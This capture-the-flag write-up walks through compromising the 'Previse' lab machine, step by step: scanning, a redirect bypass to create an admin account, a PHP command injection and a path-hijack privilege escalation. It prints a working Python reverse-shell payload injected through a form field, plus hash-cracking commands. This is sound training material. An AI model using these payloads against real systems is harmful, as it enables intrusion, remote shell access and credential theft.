## Previse

Difficulty: Easy

### User Flag

```
rustscan -a 10.10.11.104 --ulimit 5000 -- -A -sV -sC
```

![rustscan](https://user-images.githubusercontent.com/58514930/226720951-de8633a0-2aa7-48e4-bca1-8e1e27494b7e.png)

<br>

In port 80 there is just a login panel, so we enumerate with .php extension.

```
gobuster dir -u http://10.10.11.104 -w /usr/share/wordlists/dirb/big.txt -t 40 -x php
```

GoBuster return us some pages but all redirect us to the login.

![gobuster](https://user-images.githubusercontent.com/58514930/226722831-58cdf513-ec5f-485f-89a9-dcafdbf33b2c.png)

<br>

We can bypass this by changing the response 302 of redirection to 200 OK. This is called Execution After Redirect (EAR).

So we do this to the accounts.php to create an admin account for us.

![createAccount](https://user-images.githubusercontent.com/58514930/226722168-a85638ad-b508-44bb-b1f6-0f88d99e5a1a.png)

<br>

Now logged in, you can download sitebackup.zip inside files.php.

![sitebackup](https://user-images.githubusercontent.com/58514930/226722324-72ba8857-02a7-4467-bb87-1c5bbcf734a6.png)

<br>

This zip contains the php files of the website.

One is config.php that has the database credentials.

![configPHP](https://user-images.githubusercontent.com/58514930/226722390-bd12e8fc-3f23-45cf-a18d-0747630d46cc.png)

<br>

Looking through the source code, something calls our attention.

Logs.php contain a command execution and we can control the "delim" parameter.

```php
$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
```

![logsPHP](https://user-images.githubusercontent.com/58514930/226723338-6bac1aa9-8bbf-4e75-a784-7635916f9594.png)

<br>

We can obtain a reverse shell putting this payload in delim parameter:

```
;+/usr/bin/python+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect(("10.10.14.5",4444))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3bos.dup2(s.fileno(),2)%3bimport+pty%3b+pty.spawn("sh")'
```

![commandInjection](https://user-images.githubusercontent.com/58514930/226724364-ebcd130d-c437-4edf-91eb-592eaa276427.png)

<br>

With a shell, we can take a look at the database.

![database](https://user-images.githubusercontent.com/58514930/226724413-1862224e-d02d-410c-8920-7b5c25220ed3.png)

<br>

Inside previse database we found m4lwhere hash.

Let's break it with hashcat.

```
hashcat -a 0 -m 500 hash /usr/share/wordlists/rockyou.txt
```

![hashcat](https://user-images.githubusercontent.com/58514930/226725091-d6a1270a-1e4c-4328-aeda-12e003ce09e4.png)

<br>

Log into SSH with this credentials and get user flag.

### Root Flag

Enumerating with sudo -l, we can execute a script with root permissions.

![privEnumeration](https://user-images.githubusercontent.com/58514930/226725355-6d465742-0fe8-4db0-8b73-bb2979cb3147.png)

<br>

This script calls relative path of gzip, so, classical path hijacking here it is.

Just create a gzip file with a reverse shell and add the directory to the variable $PATH.

![privEsc](https://user-images.githubusercontent.com/58514930/226725647-7ae84da8-18ef-483f-9053-786d55b86386.png)
